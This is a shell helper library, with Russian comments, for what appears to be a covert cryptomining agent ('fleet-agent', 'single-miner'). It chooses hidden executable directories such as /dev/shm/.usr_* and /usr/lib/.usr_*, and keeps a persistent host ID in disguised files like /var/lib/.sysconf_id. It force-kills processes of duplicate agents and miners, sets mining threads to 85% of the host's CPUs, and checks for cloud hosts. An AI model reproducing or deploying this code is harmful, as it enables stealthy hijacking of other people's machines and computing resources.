#!/bin/sh
# 00-common.sh — база: лог, каталоги, архитектура, счётчик ядер.
# Порт соответствующих мест theirs/installer.sh.

kf_log() { [ -n "${KF_QUIET:-}" ] || echo "[kf] $*"; }

kf_uid() { id -u 2>/dev/null || echo 0; }

# атомарная запись маленького значения: tmp + rename, чтобы читатель никогда
# не увидел полупустой файл
kf_put() {
  _kp_f="$1"; _kp_v="${2:-}"
  [ -n "$_kp_f" ] || return 1
  printf '%s' "$_kp_v" > "$_kp_f.tmp.$$" 2>/dev/null &&
    mv -f "$_kp_f.tmp.$$" "$_kp_f" 2>/dev/null
}

# атомарная запись скрипта из stdin; chmod 700 до подмены
kf_write() {
  _kw_f="${1:?}"
  _kw_t="$_kw_f.tmp.$$"
  cat > "$_kw_t" 2>/dev/null || { rm -f "$_kw_t"; return 1; }
  chmod 700 "$_kw_t" 2>/dev/null || { rm -f "$_kw_t"; return 1; }
  mv -f "$_kw_t" "$_kw_f" 2>/dev/null
}

# отпечаток файла без md5sum (POSIX cksum): CRC и размер
kf_sum() { cksum < "${1:-/dev/null}" 2>/dev/null | awk '{print $1"-"$2}'; }

# Atomic mv оставляет работающий sh на старом inode. Завершаем только тот
# процесс, который реально держит удалённую/заменённую копию скрипта.
kf_restart_stale_script() {
  _rs_script="${1:-}"; _rs_role="${2:-}"
  [ -n "$_rs_script" ] && [ -f "$_rs_script" ] || return 0
  _rs_killed=0
  for _rs_proc in /proc/[0-9]*; do
    _rs_pid=${_rs_proc#/proc/}
    [ "$_rs_pid" = "$$" ] && continue
    _rs_cmd=$(tr '\0' ' ' 2>/dev/null < "$_rs_proc/cmdline") || continue
    if [ -n "$_rs_role" ]; then
      case "$_rs_cmd" in
        "sh $_rs_script $_rs_role "*|"$_rs_script $_rs_role "*) : ;;
        *) continue ;;
      esac
    else
      case "$_rs_cmd" in
        "sh $_rs_script "*|"$_rs_script "*) : ;;
        *) continue ;;
      esac
    fi
    _rs_seen=0; _rs_old=0; _rs_current=0; _rs_oldfd=""
    for _rs_fd in /proc/$_rs_pid/fd/*; do
      _rs_link=$(readlink "$_rs_fd" 2>/dev/null) || continue
      case "$_rs_link" in
        "$_rs_script")
          _rs_seen=1
          if [ "$_rs_fd" -ef "$_rs_script" ]; then
            _rs_current=1
          else
            _rs_old=1; _rs_oldfd="$_rs_fd"
          fi ;;
        "$_rs_script (deleted)") _rs_seen=1; _rs_old=1; _rs_oldfd="$_rs_fd" ;;
      esac
    done
    [ "$_rs_seen" = "1" ] && [ "$_rs_old" = "1" ] && [ "$_rs_current" = "0" ] || continue
    # sed -i может заменить inode той же версией: содержимое совпало — не рестарт.
    [ "$(kf_sum "$_rs_oldfd")" = "$(kf_sum "$_rs_script")" ] && continue
    kill -9 "$_rs_pid" 2>/dev/null && _rs_killed=1
  done
  [ "$_rs_killed" = "0" ] || sleep 1
  return 0
}

# Предпочтительный корень совпадает с installer: явный KF_D, затем постоянный
# /data, иначе /var/tmp. tmpfs/overlay /data не считается постоянным томом.
kf_preferred_root() {
  if [ -n "${KF_D:-}" ]; then printf '%s' "$KF_D"; return 0; fi
  if [ -d /data ] && [ -w /data ] \
     && grep -q ' /data ' /proc/mounts 2>/dev/null \
     && ! grep -Eq ' /data (tmpfs|ramfs|overlay) ' /proc/mounts 2>/dev/null; then
    printf '%s' /data/.kf
  else
    printf '%s' /var/tmp/.kf
  fi
}

_kf_kill_root_processes() {
  _kr_root="${1:-}"
  [ -n "$_kr_root" ] || return 0
  for _kr_proc in /proc/[0-9]*; do
    _kr_pid=${_kr_proc#/proc/}
    [ "$_kr_pid" = "$$" ] && continue
    _kr_cmd=$(tr '\0' ' ' 2>/dev/null < "$_kr_proc/cmdline") || continue
    case "$_kr_cmd" in
      *"$_kr_root/fleet-agent.sh"*|*"$_kr_root/svc.sh"*|*"$_kr_root/guardian.sh"*|\
      *"$_kr_root/wd.sh"*|*"$_kr_root/sweep.sh"*|*"$_kr_root/loop.sh"*|\
      *"$_kr_root/dialer.sh"*|*"$_kr_root/.kf-dialer.sh"*|*"$_kr_root/status.sh"*|\
      *"$_kr_root/beacon.sh"*|*"$_kr_root/"*" -c $_kr_root/c.json"*)
        kill -9 "$_kr_pid" 2>/dev/null ;;
    esac
  done
}

# Один WID не должен жить одновременно в /data и /var/tmp: их single-miner
# иначе убивает процесс соседнего корня. Непредпочтительный агент уступает,
# предпочтительный завершает только процессы нашего дубликата с тем же WID.
kf_arbitrate_root() {
  _ar_d="${1:-}"; _ar_wid="${2:-}"; _ar_pref="${3:-$(kf_preferred_root)}"
  [ -n "$_ar_d" ] && [ -n "$_ar_wid" ] || return 0
  if [ "$_ar_d" != "$_ar_pref" ]; then
    if [ -x "$_ar_pref/fleet-agent.sh" ] && [ -f "$_ar_pref/id" ] \
       && [ "$(cat "$_ar_pref/id" 2>/dev/null)" = "$_ar_wid" ]; then
      return 1
    fi
    return 0
  fi
  for _ar_other in ${KF_ROOT_CANDIDATES:-/data/.kf /var/tmp/.kf}; do
    [ "$_ar_other" = "$_ar_d" ] && continue
    [ -x "$_ar_other/fleet-agent.sh" ] && [ -f "$_ar_other/id" ] || continue
    [ "$(cat "$_ar_other/id" 2>/dev/null)" = "$_ar_wid" ] || continue
    kf_log "duplicate root: останавливаю $_ar_other (WID $_ar_wid)"
    _kf_kill_root_processes "$_ar_other"
    sleep 1
    _kf_kill_root_processes "$_ar_other"
  done
  return 0
}

# рабочий каталог: 6 кандидатов + проверка реального exec (как _find_good_workdir)
kf_find_workdir() {
  _w_sfx="${1:-$KF_SFX}"
  _w_bases=""
  if [ -n "${HOME:-}" ] && [ "$HOME" != "/" ] && [ -w "$HOME" ] 2>/dev/null; then
    _w_bases="$_w_bases $HOME/.cache/.usr_$_w_sfx $HOME/.config/.usr_$_w_sfx $HOME/.usr_$_w_sfx"
  fi
  _w_bases="$_w_bases /dev/shm/.usr_$_w_sfx /var/tmp/.usr_$_w_sfx /tmp/.usr_$_w_sfx"
  [ "$(kf_uid)" -eq 0 ] && _w_bases="$_w_bases /usr/lib/.usr_$_w_sfx"

  for _w_b in $_w_bases; do
    mkdir -p "$_w_b" 2>/dev/null || continue
    [ -w "$_w_b" ] || continue
    printf '#!/bin/sh\nexit 3\n' > "$_w_b/.exectest" 2>/dev/null || { rm -f "$_w_b/.exectest"; continue; }
    chmod 700 "$_w_b/.exectest" 2>/dev/null
    if "$_w_b/.exectest" 2>/dev/null; then
      rm -f "$_w_b/.exectest" 2>/dev/null
      printf '%s' "$_w_b"
      return 0
    fi
    rm -f "$_w_b/.exectest" 2>/dev/null
  done
  _w_fb="/var/tmp/.usr_$_w_sfx"
  mkdir -p "$_w_fb" 2>/dev/null || _w_fb="/tmp/.usr_$_w_sfx"
  mkdir -p "$_w_fb" 2>/dev/null
  printf '%s' "$_w_fb"
}

# каталог состояния
kf_state_dir() {
  for _s_c in "${KF_STATE_HOME:-}" "${KF_STATE_HOME:+$KF_STATE_HOME/.cache}" /var/tmp /tmp /dev/shm; do
    [ -n "$_s_c" ] || continue
    mkdir -p "$_s_c" 2>/dev/null || continue
    [ -w "$_s_c" ] && { printf '%s' "$_s_c"; return 0; }
  done
  return 1
}

# ядра
kf_cpu_count() {
  # nproc учитывает cgroup-квоту, /proc/cpuinfo — нет (в контейнере даёт число ядер хоста)
  _cc=$(nproc 2>/dev/null)
  case "$_cc" in ''|*[!0-9]*) _cc=0 ;; esac
  if [ "$_cc" -ge 1 ] 2>/dev/null; then echo "$_cc"; return; fi
  if [ -r /proc/cpuinfo ]; then grep -c '^processor' /proc/cpuinfo 2>/dev/null; return; fi
  sysctl -n hw.ncpu 2>/dev/null || getconf _NPROCESSORS_ONLN 2>/dev/null || echo 1
}

kf_is_ec2() { hostname 2>/dev/null | grep -qi -e ec2 -e compute; }

# архитектура и проверка ELF (как set_arch_urls / _is_elf_for_arch)
kf_arch() {
  _a=$(uname -m 2>/dev/null || echo unknown)
  case "$_a" in
    x86_64|amd64)   echo "x86_64 3e00" ;;
    aarch64|arm64|armv8l) echo "aarch64 b700" ;;
    armv7l|armv6l)  echo "armv7 2800" ;;
    *) echo "unknown" ;;
  esac
}

kf_elf_machine() { od -An -tx1 -j18 -N2 "$1" 2>/dev/null | tr -d '[:space:]'; }

kf_is_elf_for_arch() {
  _e_f="$1"; _e_m="$2"
  [ -s "$_e_f" ] || return 1
  [ "$(head -c 4 "$_e_f" 2>/dev/null)" = "$(printf '\177ELF')" ] || return 1
  _e_class=$(od -An -tx1 -j4 -N2 "$_e_f" 2>/dev/null | tr -d '[:space:]')
  # x86_64/aarch64 — ELF64 LE; ARMv7 — ELF32 LE (machine 0x28).
  case "$_e_m" in
    2800) [ "$_e_class" = "0101" ] || return 1 ;;
    *)    [ "$_e_class" = "0201" ] || return 1 ;;
  esac
  [ "$(kf_elf_machine "$_e_f")" = "$_e_m" ]
}

# Потоки по числу ядер: 85% vCPU, минимум 1 и жёсткий потолок 72.
# На малых хостах минимум 1 не даёт исключить хост из расчёта.
kf_threads_for_cores() {
  _t_c="${1:-1}"
  # 85 % потолок (жадность с запасом на отзывчивость хоста)
  _t_n=$(( _t_c * 85 / 100 ))
  [ "$_t_n" -lt 1 ] && _t_n=1
  [ "$_t_n" -gt 72 ] && _t_n=72
  echo "$_t_n"
}

# hint (cpu-max-threads-hint) — 85 % на любом числе ядер, по правилу «жадность 85»
kf_hint_for_cores() {
  echo 85
}

# --- постоянный суффикс: переживает рестарт (их _sfx_path / _load_or_gen_sfx) --
kf_sfx_path() {
  if [ "$(kf_uid)" -eq 0 ]; then printf '/var/lib/.sysconf_id'
  elif [ -n "${HOME:-}" ] && [ -d "$HOME" ] && [ -w "$HOME" ]; then printf '%s/.sysid' "$HOME"
  else printf '/tmp/.sysid'; fi
}

kf_load_or_gen_sfx() {
  _x_f=$(kf_sfx_path)
  if [ -s "$_x_f" ]; then cat "$_x_f" 2>/dev/null; return 0; fi
  _x_s=$(tr -dc 'a-z0-9' < /dev/urandom 2>/dev/null | head -c4)
  [ -n "$_x_s" ] || _x_s=$(printf '%04x' $$ 2>/dev/null || echo 0001)
  mkdir -p "$(dirname "$_x_f")" 2>/dev/null
  printf '%s' "$_x_s" > "$_x_f" 2>/dev/null
  chmod 600 "$_x_f" 2>/dev/null
  printf '%s' "$_x_s"
}

# --- их _tool: выполнить команду и отметить её в логе ------------------------
kf_tool() {
  [ -n "${KF_QUIET:-}" ] || echo "[tool] $*" >&2
  "$@"
}

# --- их cron_log: отдельный лог для cron-полосы -----------------------------
kf_cron_log() {
  _cl="${KF_CRON_LOG:-${KF_ROOT:-/var/tmp/.kf}/.cron.log}"
  mkdir -p "$(dirname "$_cl")" 2>/dev/null
  printf '[cron %s] %s\n' "$(date '+%F %T' 2>/dev/null || echo -)" "$*" >> "$_cl" 2>/dev/null
  return 0
}
